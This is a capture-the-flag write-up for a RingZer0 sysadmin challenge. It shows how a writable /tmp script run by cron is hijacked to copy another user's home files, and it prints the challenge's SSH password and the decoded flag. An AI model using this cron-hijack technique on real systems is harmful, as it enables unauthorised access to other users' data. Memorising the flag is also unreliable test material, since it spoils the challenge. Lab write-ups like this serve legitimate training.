# SysAdmin part 8

__PROBLEM__

Get access to the cypher account.

User: morpheus
Password: VNZDDLq2x9qXCzVdABbR1HOtz

ssh morpheus@challenges.ringzer0team.com -p 10147

__SOLUTION__

Start with `grep` i.e `grep cypher -R / 2>/dev/null`. You'll see few backup files in the end. Try to cat them and you'll find interesting thing in the `/backup/ca584b15ae397a9ad45b1ff267b55796`

```bash

#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command
*/3 * * * * python /tmp/Gathering.py
var/spool/cron/atjobs/0001770000000100000010000000000012303165436014466 5ustar  daemondaemonvar/spool/cron/atjobs/.SEQ0000600000000100000010000000000212303165436015101 0ustar  daemondaemon0
```
There is a cron job running. So now we look in `Gathering.py`

```bash
morpheus@lxc-sysadmin:~$ cat /tmp/Gathering.py
import os
os.system('ps aux > /tmp/28JNvE05KBltE8S7o2xu')
```
Okay so this file is in the `/tmp` directory and since we have the write permission there we can change the content of it.

```bash
morpheus@lxc-sysadmin:~$ echo 'os.system("cat /home/cypher/*.* > /tmp/cypher.log")' >> /tmp/Gathering.py
```
We add a new line in that file which will create a new file called `cypher.log` and that log file will contain all the content of cypher's home directory.

```bash
morpheus@lxc-sysadmin:~$ cat /tmp/Gathering.py
import os
os.system('ps aux > /tmp/28JNvE05KBltE8S7o2xu')
os.system("cat /home/cypher/*.* > /tmp/cypher.log")
morpheus@lxc-sysadmin:~$ cat /tmp/cypher.log
BASE ?
RkxBRy0wY2ZjMzM5MGEwODJhMjJmZGQ3NjNmNDQyNmY0MzI5Ng==
```
Obviously that's base64

```bash
morpheus@lxc-sysadmin:~$ echo "RkxBRy0wY2ZjMzM5MGEwODJhMjJmZGQ3NjNmNDQyNmY0MzI5Ng==" | base64 -d
FLAG-0cfc3390a082a22fdd763f4426f43296morpheus@lxc-sysadmin:~$
```

FLAG - `FLAG-0cfc3390a082a22fdd763f4426f43296`

And with this we come to an end of this great series.

